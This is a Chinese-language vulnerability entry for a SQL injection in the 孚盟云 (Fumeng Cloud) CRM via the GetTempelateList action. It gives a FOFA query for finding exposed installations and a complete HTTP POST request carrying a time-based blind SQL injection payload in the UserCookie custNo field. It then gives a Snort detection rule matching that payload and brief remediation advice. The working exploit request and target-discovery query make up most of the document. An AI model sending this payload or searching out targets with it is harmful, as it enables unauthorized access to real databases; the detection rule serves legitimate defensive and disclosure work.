# 孚盟云-GetTempelateList-sql注入

孚盟云-GetTempelateList-sql注入，攻击者可进行sql注入攻击获取数据库信息或者权限。

# 影响版本

孚盟云

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="孚盟软件-孚盟云"

POC/EXP：

```
POST /m/Dingding/Ajax/AjaxBusinessPriceActiveReports.ashx HTTP/1.1
Host: 127.0.0.1
Cookie: UserCookie={"custNo":"1') AND (SELECT 4920 FROM (SELECT(SLEEP(5)))ILaK)-- -"}
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

action=GetTempelateList
```

![image-20260116164429456](assets/image-20260116164429456.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"孚盟云 - MySQL Time-Based SQL Injection via GetTempelateList";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/m/Dingding/Ajax/AjaxBusinessPriceActiveReports.ashx";
    http.header; content:"Content-Type: application/x-www-form-urlencoded";
    http.header; pcre:"/UserCookie=\{[\"]?custNo[\"]?:[\"]?\d+'\) AND \(SELECT \d+ FROM \(SELECT\(SLEEP\(\d+\)\)\)[a-zA-Z]+\)-- -/i";
    http.request_body; content:"action=GetTempelateList";
    metadata:
        cve none,
        service http,
        affected_product "孚盟云",
        vulnerability_type "MySQL Time-Based SQL Injection",
        attack_target "database_server",
        severity "high";
    classtype:sql-injection;
    sid:1000572;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
